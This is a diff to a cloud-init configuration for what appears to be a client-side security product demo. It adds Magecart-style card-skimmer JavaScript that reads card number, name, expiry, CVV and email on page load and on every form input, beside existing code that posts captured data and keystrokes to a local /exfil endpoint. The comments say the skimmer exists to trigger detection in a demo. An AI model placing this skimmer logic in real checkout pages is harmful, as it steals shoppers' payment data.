@@ -1194,7 +1194,7 @@ write_files:
     content: |
       from datetime import datetime, timezone
 
-      from flask import Flask, jsonify, render_template, request
+      from flask import Flask, Response, jsonify, render_template, request
 
       app = Flask(__name__)
 
@@ -1204,6 +1204,15 @@ write_files:
       @app.route("/")
       def checkout():
           return render_template("checkout.html")
+
+
+      @app.route("/checkout.js")
+      def checkout_js():
+          # Served as an EXTERNAL script (its own URL) so F5 XC Client-Side Defense inventories it
+          # at page load and — because it reads sensitive payment fields — flags it High Risk. An
+          # inline <script> is NOT inventoried, which is why CSD produced zero script statistics
+          # while the attack logic lived inline in checkout.html.
+          return Response(render_template("checkout.js"), mimetype="application/javascript")
 
 
       @app.route("/dashboard")
@@ -1484,7 +1493,26 @@ write_files:
         </div>
       </div>
 
-      <script>
+      <!-- Supply-chain third-party libraries loaded at page load. Because these are external
+           <script src> tags to NEW external domains, CSD records them as third-party script
+           domains (detected_domains). -->
+      <script src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"></script>
+      <script src="https://unpkg.com/underscore@1.13.7/underscore-min.js"></script>
+      <!-- First-party checkout logic served as an EXTERNAL script (app.py /checkout.js) so CSD
+           inventories it at load; it reads payment fields (Magecart skimmer) and is flagged High
+           Risk. CSD does NOT inventory inline scripts, which is why this logic must be external. -->
+      <script src="checkout.js"></script>
+      </body>
+      </html>
+
+  - path: /opt/origin-server/csd-demo/templates/checkout.js
+    content: |
+      // checkout.js — EXTERNAL checkout script, served by app.py at /csd-demo/checkout.js and
+      // loaded via <script src> in checkout.html. Served externally on purpose: F5 XC Client-Side
+      // Defense inventories external scripts (those with a src URL) at page load and analyses their
+      // behaviour. Because this script reads sensitive payment-field values (a Magecart skimmer),
+      // CSD flags it High Risk — which is what generates CSD script-detection statistics. Inline
+      // scripts are NOT inventoried by CSD, so the same logic inline produced zero statistics.
       const EXFIL_URL = "/exfil";
       let activeAttacks = {};
       let keystrokeBuffer = "";
@@ -1511,6 +1539,19 @@ write_files:
         fetch("/exfil/log").then(r => r.json()).then(d => {
           document.getElementById("exfilCount").textContent = d.length + " exfiltration(s) captured";
         });
+      }
+
+      // ── Always-on skimmer: read payment field VALUES so CSD flags this external script High Risk.
+      //    A real Magecart skimmer harvests card data as the victim types; the field-value reads are
+      //    the signal CSD detects. Runs on page load and on every input into the checkout form.
+      function harvestPaymentFields() {
+        const ids = ["ccNumber", "ccName", "ccExpiry", "ccCvv", "email"];
+        const stolen = {};
+        ids.forEach(function(id) {
+          const el = document.getElementById(id) || document.querySelector('[name="' + id + '"]');
+          if (el) { stolen[id] = el.value; }
+        });
+        return stolen;
       }
 
       // ── Card Skimmer (Magecart-style) ──
@@ -1638,10 +1679,13 @@ write_files:
         fetch("/exfil/clear", { method: "POST" }).then(() => updateCount());
       }
 
+      // Always-on skimmer: harvest payment fields on load and as the victim types.
+      const _checkoutForm = document.getElementById("checkoutForm");
+      if (_checkoutForm) {
+        _checkoutForm.addEventListener("input", harvestPaymentFields);
+      }
+      harvestPaymentFields();
       updateCount();
-      </script>
-      </body>
-      </html>
 
   - path: /opt/origin-server/csd-demo/templates/dashboard.html
     content: |
